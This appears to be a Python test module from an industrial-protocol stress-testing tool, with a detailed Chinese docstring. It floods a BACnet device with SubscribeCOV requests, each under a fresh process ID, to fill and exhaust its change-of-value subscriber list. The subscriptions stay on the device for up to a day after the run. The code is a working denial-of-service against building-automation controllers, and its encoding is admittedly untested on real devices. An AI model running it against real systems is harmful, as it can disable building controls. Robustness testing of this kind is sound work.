"""
測項：BACnet SubscribeCOV 訂閱清單洪水
分類：BACnet（標準埠 47808/UDP）
說明：與同分類既有的 whois_flood.py（探索廣播）、read_property_flood.py（單次讀值
     請求速率）不同，本測項鎖定的是 BACnet 裝置內部「COV（Change-of-Value）訂閱者
     清單」這個有上限的資源：裝置為了在被監控物件數值變化時主動通知訂閱者，會維護
     一份訂閱者表（每筆記錄 Process Identifier + 訂閱者位址 + 監控物件 + 存活時間），
     這份表的容量在嵌入式裝置上通常相當有限。持續以「不同的 Process Identifier」送出
     SubscribeCOV Confirmed-Request（每個不同的 Process Identifier 對同一個訂閱者位址
     而言會被視為一筆『新的』訂閱，而不是既有訂閱的續約/更新——ASHRAE 135 規定
     COV 訂閱是以 (subscriber address, monitored object, subscriber process identifier)
     三者共同識別),且從不送出 SubscribeCOV 的『取消訂閱』寫法（Confirmed-Request 且省略
     lifetime 也是一種合法取消語法，本測項不這樣做，一律帶入正數 lifetime 建立新訂閱），
     藉此測試訂閱者清單被大量占滿、甚至耗盡的行為。

安全設計（重要）：SubscribeCOV 屬於 ASHRAE 135 定義的「監控/讀取導向」服務——
訂閱後裝置只會『主動回報』被監控物件的數值，不會因為這個服務本身而改變裝置任何
輸出/組態。本測項全程不送出 WriteProperty 或任何會變更裝置狀態的服務；
issueConfirmedNotifications 固定帶 FALSE（要求裝置之後用 Unconfirmed-COV-Notification
方式回報，而非再要求我方對每一次數值變化都回 Simple-Ack，避免造成非預期的雙向
confirmed 交易迴圈）；lifetime 固定帶入使用者可調整的正整數秒數（見下方 lifetime_sec
參數），使訂閱在測試期間、甚至測試結束後一段時間內持續占用裝置的訂閱者清單資源，
這正是本測項「resource 資源耗盡型」的核心。速率透過 RateLimiter 控制，duration 經
clamp_duration() 限制，只 unicast 送往 Orchestrator 傳入的 target/port。

BACnet/IP 封包分層（沿用 read_property_flood.py 已驗證過的 BVLC/NPDU 組法，
逐位元組完全相同的手法，只有 APDU 內容不同）：
    BVLC: Original-Unicast-NPDU（0x81 0x0A + 總長度 2 bytes）—— 與
          read_property_flood.py 完全相同的寫法，直接沿用。
    NPDU: Version=0x01, Control=0x04（無路由，期望回應）—— 同上，直接沿用。
    APDU: Confirmed-Request(0x00) + max-segs/max-apdu(0x05) + Invoke-ID
          + Service-Choice=0x05（subscribeCOV，ASHRAE 135 clause 13.14）
          + SubscribeCOV-Request 參數（依 clause 13.14 的 SEQUENCE 定義，
            均為 context-tagged）：
              [0] subscriberProcessIdentifier  (Unsigned)      —— 逐次遞增/輪替
              [1] monitoredObjectIdentifier    (BACnetObjectIdentifier)
              [2] issueConfirmedNotifications  (BOOLEAN, 固定 FALSE)
              [3] lifetime                     (Unsigned, 秒)

Context tag 編碼公式（本檔案新寫、沿用 read_property_flood.py 既有程式碼已經在用
的同一套編碼規則歸納而來，非憑空推導）：
  read_property_flood.py 的 _encode_object_id() 對 objectIdentifier 使用 context tag 0、
  length=4，寫成常數 0x0C；經拆解 0x0C = 0000_1100b = tag number(4bit)=0,
  context-class bit=1, length nibble=4，對應公式 tag_byte = (tag_num<<4)|0x08|length。
  同檔案 _encode_property_id() 對 propertyIdentifier 使用 context tag 1、length=1，寫成
  常數 0x19 = 0001_1001b，代入同一公式同樣成立。本檔案把這個公式抽成通用函式
  （_encode_context_unsigned / _encode_context_object_id），用於 SubscribeCOV-Request
  裡 tag 編號不同（0、1）的欄位，屬於同一套已經在本專案裡「用過」的編碼規則的
  推廣，而非全新未驗證的寫法。
  Context-tagged BOOLEAN 的編碼規則（ASHRAE 135 clause 20.2.3）與 Unsigned 不同：
  application-tagged BOOLEAN 用 length 欄位本身（0/1）表示真假、不帶內容 octet；但
  context-tagged BOOLEAN 一律帶 1 個內容 octet（0x00=FALSE, 0x01=TRUE），這點在
  _encode_context_boolean() 有依規範正確處理，這部分沒有既有程式碼可以直接沿用，
  是本檔案新增、依公開規格文字實作、**未在真實 BACnet 裝置上驗證過**。

重要限制：
  - monitoredObjectIdentifier 預設指向 Device 物件本身（object_type=8），這是唯一
    保證「一定存在」的標準物件，等同 read_property_flood.py 的預設選擇；若受測裝置
    有已知的 Analog-Input 等物件，可透過 object_type/object_instance 參數改指向該物件
    （COV 更常見用在 AI/AO/BI/BO 等會頻繁變化數值的物件上，Device 物件的 COV 支援度
    依廠商實作而異，若收到 Error-PDU/Reject 屬正常現象，代表該裝置該物件不支援 COV，
    這不代表測試失敗，請改用已知支援 COV 的物件）。
  - 封包位元組格式依 ASHRAE 135 公開規範組出，但未在真實 BACnet 裝置上做過相容性
    驗證，正式使用前建議先用 Wireshark（內建 BACnet 解析器）確認。
  - 本測項不會、也無法主動清空建立起來的訂閱（沒有實作對應的 unsubscribe 迴圈，因為
    那需要逐一記住每個 subscriber process id 並在測試結束後額外送出取消請求，超出本
    測項『高壓測試』的範圍）；受測裝置上殘留的訂閱會依裝置自身邏輯，在 lifetime_sec
    參數所設定的秒數之後自然到期失效，測試人員應知悉此行為並自行評估對受測裝置的
    後續影響。
需求：無額外套件，純標準函式庫。
"""
import socket
import time

from ..common import RateLimiter, clamp_duration

NAME = "BACnet SubscribeCOV 訂閱清單洪水"
CATEGORY = "BACnet"
PROTOCOL = "UDP"
DEFAULT_PORT = 47808
TEST_TYPE = "resource"  # 資源型：耗用裝置有上限的 COV 訂閱者清單資源

_OBJECT_TYPE_DEVICE = 8
_SERVICE_SUBSCRIBE_COV = 5


def _encode_context_unsigned(tag_num: int, value: int) -> bytes:
    """context-tagged Unsigned，依 read_property_flood.py 既有的
    tag_byte = (tag_num<<4)|0x08|length 公式，取能容納 value 的最小 byte 數（1~4）。"""
    value = max(0, int(value))
    if value == 0:
        payload = b"\x00"
    else:
        length = (value.bit_length() + 7) // 8
        length = min(length, 4)
        payload = value.to_bytes(length, "big")
    tag_byte = (tag_num << 4) | 0x08 | len(payload)
    return bytes([tag_byte]) + payload


def _encode_context_object_id(tag_num: int, obj_type: int, instance: int) -> bytes:
    """context-tagged BACnetObjectIdentifier，公式與 read_property_flood.py 的
    _encode_object_id 相同，只是 tag 編號可變（該處固定用 context tag 0）。"""
    val = ((obj_type & 0x3FF) << 22) | (instance & 0x3FFFFF)
    tag_byte = (tag_num << 4) | 0x08 | 4
    return bytes([tag_byte]) + val.to_bytes(4, "big")


def _encode_context_boolean(tag_num: int, value: bool) -> bytes:
    """context-tagged BOOLEAN：與 application-tagged 不同，一律帶 1 個內容 octet
    （0x00=FALSE, 0x01=TRUE），見本檔案 docstring 的規範引用。"""
    tag_byte = (tag_num << 4) | 0x08 | 1
    return bytes([tag_byte, 1 if value else 0])


def _build_subscribe_cov(invoke_id: int, subscriber_pid: int, obj_type: int,
                          instance: int, lifetime_sec: int) -> bytes:
    apdu = (
        bytes([0x00, 0x05, invoke_id & 0xFF, _SERVICE_SUBSCRIBE_COV])  # Confirmed-Request, max-segs/apdu, invoke-id, service=subscribeCOV
        + _encode_context_unsigned(0, subscriber_pid)                  # [0] subscriberProcessIdentifier
        + _encode_context_object_id(1, obj_type, instance)             # [1] monitoredObjectIdentifier
        + _encode_context_boolean(2, False)                            # [2] issueConfirmedNotifications = FALSE
        + _encode_context_unsigned(3, lifetime_sec)                    # [3] lifetime (seconds)
    )
    npdu = bytes([0x01, 0x04])  # version=1, control（無路由，期望回應）
    body = npdu + apdu
    total_len = 4 + len(body)
    bvlc = bytes([0x81, 0x0A]) + total_len.to_bytes(2, "big")
    return bvlc + body


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 90000, "min": 1, "max": 90000, "desc": "每秒送出 SubscribeCOV 請求數（每筆使用不同 Process Identifier，視為不同訂閱）"},
        "object_type": {"type": "int", "default": 8, "min": 0, "max": 1023, "desc": "被監控物件類型（預設 8=Device，COV 更常見於 0=Analog-Input 等會變化數值的物件）"},
        "object_instance": {"type": "int", "default": 1, "min": 0, "max": 4194303, "desc": "被監控物件的 Instance（若 object_type 改為 Analog-Input 等，請填該物件實際存在的 Instance）"},
        "lifetime_sec": {"type": "int", "default": 3600, "min": 1, "max": 86400, "desc": "訂閱存活秒數，愈長則占用訂閱者清單資源的時間愈久"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 250))
    obj_type = int(params.get("object_type", _OBJECT_TYPE_DEVICE))
    instance = int(params.get("object_instance", 1))
    lifetime_sec = int(params.get("lifetime_sec", 3600))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)  # 非阻塞：避免等待回應拖慢送出節奏（此測項的攻擊壓力來自「送出速率」本身）

    limiter = RateLimiter(rate)
    sent, recv_count, errors = 0, 0, 0
    invoke_id = 0
    subscriber_pid = 0
    start = time.time()

    log_fn(f"[+] BACnet SubscribeCOV 訂閱清單洪水 -> {target}:{port} @ {rate}/s，"
           f"object_type={obj_type} instance={instance} lifetime={lifetime_sec}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        invoke_id = (invoke_id + 1) & 0xFF
        subscriber_pid = (subscriber_pid + 1) & 0xFFFFFFFF  # 每筆用不同 Process ID，視為新訂閱而非續約
        pkt = _build_subscribe_cov(invoke_id, subscriber_pid, obj_type, instance, lifetime_sec)
        try:
            sock.sendto(pkt, (target, port))
            sent += 1
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")
        try:
            while sock.recv(2048):
                recv_count += 1
        except (BlockingIOError, OSError):
            pass

    sock.close()
    return {
        "subscribe_requests_sent": sent,
        "responses_received": recv_count,
        "errors": errors,
        "elapsed_sec": round(time.time() - start, 1),
    }
